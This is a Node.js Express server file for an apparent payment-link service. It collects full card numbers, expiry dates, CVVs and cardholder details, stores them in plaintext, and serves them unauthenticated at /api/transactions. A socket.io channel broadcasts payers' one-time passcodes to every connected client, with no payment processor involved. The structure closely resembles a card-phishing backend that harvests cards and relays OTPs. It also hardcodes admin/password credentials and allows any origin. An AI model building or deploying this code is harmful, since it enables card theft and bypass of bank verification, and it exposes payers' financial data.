// server.js
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import { Server } from 'socket.io';
import http from 'http';
import crypto from 'crypto';

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*", }
});

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// --- In-Memory Data Stores ---
const paymentLinks = [];  // Array to store generated payment links
const transactions = [];  // Array to store transactions

// --- Admin Login API (dummy) ---
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  // For demo purposes, credentials are hardcoded:
  if (username === 'admin' && password === 'password') {
    // Return a dummy token (in production, use a secure token and proper authentication)
    res.json({ success: true, token: "dummy_token", user: username });
  } else {
    res.status(401).json({ success: false, message: "Invalid credentials" });
  }
});

// --- Generate Payment Link ---
// This endpoint expects JSON { amount, description }
// It returns a link that uses HTTPS and includes invoiceId, amount, and description as URL parameters.
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;
    if (!amount || isNaN(amount)) throw new Error('Invalid amount');
    if (!description || !description.trim()) throw new Error('Description required');

    const invoiceId = crypto.randomBytes(16).toString('hex');
    // Create a payment link that points to your payment.html page.
    const paymentLink = `https://www.khatapay.me/payment.html?invoiceId=${invoiceId}&amount=${amount}&desc=${encodeURIComponent(description.trim())}`;
    
    paymentLinks.push({
      invoiceId,
      amount: Number(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString(),
      active: true
    });
    
    res.json({ success: true, paymentLink });
  } catch (err) {
    console.error('Generate Link Error:', err);
    res.status(400).json({ success: false, message: err.message });
  }
});

// --- Dummy endpoint to simulate receiving payment details ---
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(16).toString('hex');
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount,
    currency,
    cardholder,
    status: 'processing',
    createdAt: new Date().toISOString()
  };
  transactions.push(transaction);
  res.json({ success: true, invoiceId });
});

// --- Get Transactions ---
app.get('/api/transactions', (req, res) => {
  res.json(transactions);
});

// --- Socket.io for OTP ---
io.on('connection', (socket) => {
  console.log("New WebSocket connection:", socket.id);
  socket.on("send-otp", (data) => {
    console.log("OTP Sent:", data);
    io.emit("receive-otp", data);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

